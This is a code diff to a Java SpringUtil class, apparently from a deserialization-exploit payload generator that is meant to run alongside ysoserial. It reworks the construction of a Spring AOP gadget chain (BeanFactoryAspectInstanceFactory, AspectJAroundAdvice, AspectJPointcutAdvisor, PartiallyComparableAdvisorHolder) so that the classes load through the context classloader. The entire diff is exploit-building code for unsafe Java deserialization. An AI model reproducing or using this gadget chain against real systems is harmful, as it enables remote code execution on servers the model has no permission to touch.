@@ -108,22 +108,26 @@ public final class SpringUtil {
      */
     public static Object makeBeanFactoryTriggerPCAH ( UtilFactory uf, String name, BeanFactory bf ) throws ClassNotFoundException,
             NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, Exception {
-        AspectInstanceFactory aif = Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
+        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+        Class clsBeanFactoryAspectInstanceFactory = classLoader.loadClass("org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory");
+        Object aif = Reflections.createWithoutConstructor(clsBeanFactoryAspectInstanceFactory);
         Reflections.setFieldValue(aif, "beanFactory", bf);
         Reflections.setFieldValue(aif, "name", name);
-        AbstractAspectJAdvice advice = Reflections.createWithoutConstructor(AspectJAroundAdvice.class);
+        // 使用当前ClassLoader加载，保证在与ysoserial同时在classpath当中时，可以使用插件classloader加载解决冲突
+        Class clsAspectJAroundAdvice = classLoader.loadClass("org.springframework.aop.aspectj.AspectJAroundAdvice");
+        Object advice = Reflections.createWithoutConstructor(clsAspectJAroundAdvice);
         Reflections.setFieldValue(advice, "aspectInstanceFactory", aif);
     
         // make readObject happy if it is called
         Reflections.setFieldValue(advice, "declaringClass", Object.class);
         Reflections.setFieldValue(advice, "methodName", "toString");
         Reflections.setFieldValue(advice, "parameterTypes", new Class[0]);
-    
-        AspectJPointcutAdvisor advisor = Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);
+
+        Class clsAspectJPointcutAdvisor = classLoader.loadClass("org.springframework.aop.aspectj.AspectJPointcutAdvisor");
+        Object advisor = Reflections.createWithoutConstructor(clsAspectJPointcutAdvisor);
         Reflections.setFieldValue(advisor, "advice", advice);
     
-        Class<?> pcahCl = Class
-                .forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
+        Class<?> pcahCl = classLoader.loadClass("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
         Object pcah = Reflections.createWithoutConstructor(pcahCl);
         Reflections.setFieldValue(pcah, "advisor", advisor);
         return uf.makeToStringTriggerUnstable(pcah);
